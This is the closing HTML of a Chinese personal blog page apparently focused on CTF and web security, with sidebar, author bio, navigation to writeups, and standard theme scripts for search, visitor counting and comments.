+        
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/qiangwangbei.html" rel="next" title="强网杯-writeup">
+                <i class="fa fa-chevron-left"></i> 强网杯-writeup
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/由一道ctf题引发的思考.html" rel="prev" title="由一道CTF题目引发的思考">
+                由一道CTF题目引发的思考 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+      <div id="cloud-tie-wrapper" class="cloud-tie-wrapper"></div>
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image"
+               src="http://olgkg6ct5.bkt.clouddn.com/touxiang.jpg"
+               alt="Pupil" />
+          <p class="site-author-name" itemprop="name">Pupil</p>
+           
+              <p class="site-description motion-element" itemprop="description"></p>
+           
+        </div>
+        <nav class="site-state motion-element">
+
+          
+            <div class="site-state-item site-state-posts">
+              <a href="/archives">
+                <span class="site-state-item-count">29</span>
+                <span class="site-state-item-name">日志</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-categories">
+              <a href="/categories/index.html">
+                <span class="site-state-item-count">7</span>
+                <span class="site-state-item-name">分类</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-tags">
+              <a href="/tags/index.html">
+                <span class="site-state-item-count">8</span>
+                <span class="site-state-item-name">标签</span>
+              </a>
+            </div>
+          
+		 <br><br>
+         <span id="busuanzi_container_site_uv">
+         <b><span id="busuanzi_value_site_uv"></span></b><br>
+		 <span class="site-state-item-name">访客</span>
+         </span><br><br>
+        </nav>
+
+        
+		
+		<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=432506345&auto=0&height=66"></iframe>
+		<div align="left" font-family: "Arial","Microsoft YaHei","黑体","宋体",sans-serif>
+		<b><h1>个人简介</h1></b>
+		<p >
+		菜鸡Web狗一只，中二病患者，热爱代码审计，被CTF折磨的要死要活，拼命学习中。。。<br>
+		爱好：二次元，web渗透，偶尔会突然很文艺<br>
+		QQ：89335778
+        <div class="links-of-author motion-element">
+          
+        </div>
+
+        
+        
+
+        
+        
+
+        
+
+
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#教育机构的培训平台"><span class="nav-number">1.</span> <span class="nav-text">教育机构的培训平台</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright" >
+  
+  &copy; 
+  <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Pupil</span>
+</div>
+
+
+<div class="powered-by">
+  技术支持By Pupiles
+</div>
+
+<div class="theme-info">
+  博客 -XDSEC
+</div>
+
+
+<p>Hosted by <a href="https://pages.coding.me" style="font-weight: bold">Coding Pages</a></p>
+        
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+  
+  <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.0"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.0"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.0"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.0"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.0"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+    
+    <script>
+      var cloudTieConfig = {
+        url: document.location.href, 
+        sourceId: "",
+        productKey: "70c8d4b1771e4a19bf986d2a1c098b34",
+        target: "cloud-tie-wrapper"
+      };
+    </script>
+    <script src="https://img1.ws.126.net/f2e/tie/yun/sdk/loader.js"></script>
+  
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length == 0) {
+      search_path = "search.xml";
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.popup').toggle();
+    }
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+      $.ajax({
+        url: path,
+        dataType: "xml",
+        async: true,
+        success: function( xmlResponse ) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = $( "entry", xmlResponse ).map(function() {
+            return {
+              title: $( "title", this ).text(),
+              content: $("content",this).text(),
+              url: $( "url" , this).text()
+            };
+          }).get();
+          var $input = document.getElementById(search_id);
+          var $resultContent = document.getElementById(content_id);
+          $input.addEventListener('input', function(){
+            var matchcounts = 0;
+            var str='<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length > 1) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var content_index = [];
+                var data_title = data.title.trim().toLowerCase();
+                var data_content = data.content.trim().replace(/<[^>]+>/g,"").toLowerCase();
+                var data_url = decodeURIComponent(data.url);
+                var index_title = -1;
+                var index_content = -1;
+                var first_occur = -1;
+                // only match artiles with not empty titles and contents
+                if(data_title != '') {
+                  keywords.forEach(function(keyword, i) {
+                    index_title = data_title.indexOf(keyword);
+                    index_content = data_content.indexOf(keyword);
+                    if( index_title >= 0 || index_content >= 0 ){
+                      isMatch = true;
+                      if (i == 0) {
+                        first_occur = index_content;
+                      }
+                    }
+
+                  });
+                }
+                // show search results
+                if (isMatch) {
+                  matchcounts += 1;
+                  str += "<li><a href='"+ data_url +"' class='search-result-title'>"+ data_title +"</a>";
+                  var content = data.content.trim().replace(/<[^>]+>/g,"");
+                  if (first_occur >= 0) {
+                    // cut out 100 characters
+                    var start = first_occur - 20;
+                    var end = first_occur + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if(start == 0){
+                      end = 50;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    var match_content = content.substring(start, end);
+                    // highlight all keywords
+                    keywords.forEach(function(keyword){
+                      var regS = new RegExp(keyword, "gi");
+                      match_content = match_content.replace(regS, "<b class=\"search-keyword\">"+keyword+"</b>");
+                    });
+
+                    str += "<p class=\"search-result\">" + match_content +"...</p>"
+                  }
+                  str += "</li>";
+                }
+              })};
+            str += "</ul>";
+            if (matchcounts == 0) { str = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>' }
+            if (keywords == "") { str = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>' }
+            $resultContent.innerHTML = str;
+          });
+          proceedsearch();
+        }
+      });}
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched == false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(function(e){
+      $('.popup').hide();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    });
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+  </script>
+
+
+
+
+  
+  
+  
+  <link rel="stylesheet" href="/lib/algolia-instant-search/instantsearch.min.css">
+
+  
+  
+  <script src="/lib/algolia-instant-search/instantsearch.min.js"></script>
+  
+
+  <script src="/js/src/algolia-search.js?v=5.1.0"></script>
+
+
+
+  
+
+  
+  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.1.js"></script>
+  <script>AV.initialize("YQEVdCwfMShMt1vjaRojsYrr-gzGzoHsz", "APOpeTkajaCsoqVKYvcCMWwt");</script>
+  <script>
+    function showTime(Counter) {
+      var query = new AV.Query(Counter);
+      var entries = [];
+      var $visitors = $(".leancloud_visitors");
+
+      $visitors.each(function () {
+        entries.push( $(this).attr("id").trim() );
+      });
+
+      query.containedIn('url', entries);
+      query.find()
+        .done(function (results) {
+          var COUNT_CONTAINER_REF = '.leancloud-visitors-count';
+
+          if (results.length === 0) {
+            $visitors.find(COUNT_CONTAINER_REF).text(0);
+            return;
+          }
+
+          for (var i = 0; i < results.length; i++) {
+            var item = results[i];
+            var url = item.get('url');
+            var time = item.get('time');
+            var element = document.getElementById(url);
+
+            $(element).find(COUNT_CONTAINER_REF).text(time);
+          }
+          for(var i = 0; i < entries.length; i++) {
+            var url = entries[i];
+            var element = document.getElementById(url);
+            var countSpan = $(element).find(COUNT_CONTAINER_REF);
+            if( countSpan.text() == '') {
+              countSpan.text(0);
+            }
+          }
+        })
+        .fail(function (object, error) {
+          console.log("Error: " + error.code + " " + error.message);
+        });
+    }
+
+    function addCount(Counter) {
+      var $visitors = $(".leancloud_visitors");
+      var url = $visitors.attr('id').trim();
+      var title = $visitors.attr('data-flag-title').trim();
+      var query = new AV.Query(Counter);
+
+      query.equalTo("url", url);
+      query.find({
+        success: function(results) {
+          if (results.length > 0) {
+            var counter = results[0];
+            counter.fetchWhenSave(true);
+            counter.increment("time");
+            counter.save(null, {
+              success: function(counter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(counter.get('time'));
+              },
+              error: function(counter, error) {
+                console.log('Failed to save Visitor num, with error message: ' + error.message);
+              }
+            });
+          } else {
+            var newcounter = new Counter();
+            /* Set ACL */
+            var acl = new AV.ACL();
+            acl.setPublicReadAccess(true);
+            acl.setPublicWriteAccess(true);
+            newcounter.setACL(acl);
+            /* End Set ACL */
+            newcounter.set("title", title);
+            newcounter.set("url", url);
+            newcounter.set("time", 1);
+            newcounter.save(null, {
+              success: function(newcounter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(newcounter.get('time'));
+              },
+              error: function(newcounter, error) {
+                console.log('Failed to create');
+              }
+            });
+          }
+        },
+        error: function(error) {
+          console.log('Error:' + error.code + " " + error.message);
+        }
+      });
+    }
+
+    $(function() {
+      var Counter = AV.Object.extend("Counter");
+      if ($('.leancloud_visitors').length == 1) {
+        addCount(Counter);
+      } else if ($('.post-title-link').length > 1) {
+        showTime(Counter);
+      }
+    });
+  </script>
+
+
+
+  
+<script>
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+
+
+  
+
+  
+
+  
+  <script type="text/javascript" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+  
+</body>
+</html>
